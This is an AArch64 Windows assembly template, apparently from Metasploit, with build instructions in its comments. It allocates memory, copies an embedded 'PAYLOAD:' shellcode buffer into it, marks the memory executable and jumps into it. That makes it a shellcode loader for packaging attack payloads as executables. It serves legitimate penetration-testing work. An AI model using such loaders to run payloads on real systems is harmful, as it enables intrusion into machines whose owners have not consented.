;
; A minimal AArch64 PE template for Metasploit shellcode
; Author: Alexander 'xaitax' Hagenah
;
; --- Compilation (Microsoft Visual Studio Build Tools) ---
; 1. Assemble:
;    armasm64.exe -o template_aarch64_windows.obj template_aarch64_windows.asm
;
; 2. Link:
;    LINK.exe template_aarch64_windows.obj /SUBSYSTEM:WINDOWS /ENTRY:main /NODEFAULTLIB kernel32.lib /OUT:template_aarch64_windows.exe
;
;
; --- Cross Compilation (Microsoft Visual Studio Build Tools) ---
; 1. Locate Cross Compiler Tools and Libraries
;     In this case: C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\arm64\
;     And: C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\um\arm64
; 2. Assemble:
;    "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\arm64\armasm64.exe" -o template_aarch64_windows.obj template_aarch64_windows.asm
; 3. Link:
;    "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\arm64\link.exe"  template_aarch64_windows.obj /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.26100.0\um\arm64" /MACHINE:ARM64 /SUBSYSTEM:WINDOWS /ENTRY:main /NODEFAULTLIB kernel32.lib /OUT:template_aarch64_windows.exe
        AREA    |.text|, CODE, READONLY

; Import the Win32 functions we need from kernel32.dll
        IMPORT  VirtualAlloc
        IMPORT  VirtualProtect
        IMPORT  ExitProcess

; Define constants for Win32 API calls
SCSIZE          EQU     4096
MEM_COMMIT      EQU     0x1000
PAGE_READWRITE  EQU     0x04
PAGE_EXECUTE    EQU     0x10

; Export the entry point of our program
        EXPORT main

main
        ; Allocate space on the stack for the oldProtection variable (DWORD)
        sub     sp, sp, #16
        
        ; --- 1. Allocate executable memory ---
        ; hfRet = VirtualAlloc(NULL, SCSIZE, MEM_COMMIT, PAGE_READWRITE);
        mov     x0, #0
        mov     x1, #SCSIZE
        mov     x2, #MEM_COMMIT
        mov     x3, #PAGE_READWRITE
        ldr     x8, =VirtualAlloc
        blr     x8

        ; Check if VirtualAlloc failed. If so, exit.
        cbz     x0, exit_fail

        ; Save the pointer to our new executable buffer in a non-volatile register
        mov     x19, x0

        ; --- 2. Copy the payload into the new buffer ---
        ; This is a simple memcpy(dest, src, size)
        mov     x0, x19                 ; x0 = dest = our new buffer
        ldr     x1, =payload_buffer     ; x1 = src = the payload in our .data section
        mov     x2, #SCSIZE             ; x2 = count
copy_loop
        ldrb    w3, [x1], #1            ; Load byte from src, increment src pointer
        strb    w3, [x0], #1            ; Store byte to dest, increment dest pointer
        subs    x2, x2, #1              ; Decrement counter
        b.ne    copy_loop               ; Loop if not zero

        ; --- 3. Change memory permissions to executable ---
        ; VirtualProtect(hfRet, SCSIZE, PAGE_EXECUTE, &dwOldProtect);
        mov     x0, x19                 ; x0 = buffer address
        mov     x1, #SCSIZE             ; x1 = size
        mov     x2, #PAGE_EXECUTE       ; x2 = new protection
        mov     x3, sp                  ; x3 = pointer to oldProtection on the stack
        ldr     x8, =VirtualProtect
        blr     x8

        ; --- 4. Execute the payload ---
        ; Jump to the shellcode we just copied and protected.
        blr     x19

exit_success
        ; Shellcode returned, or we are done. Exit cleanly.
        mov     x0, #0                  ; Exit code 0
        ldr     x8, =ExitProcess
        blr     x8
        
exit_fail
        ; Something went wrong. Exit with code 1.
        mov     x0, #1
        ldr     x8, =ExitProcess
        blr     x8

; The data section where the payload will be located.
; The 'PAYLOAD:' tag must be at the very beginning of this buffer.
payload_buffer
        DCB     "PAYLOAD:"
        SPACE   SCSIZE - 8 ; Reserve the rest of the 4096 bytes

        END
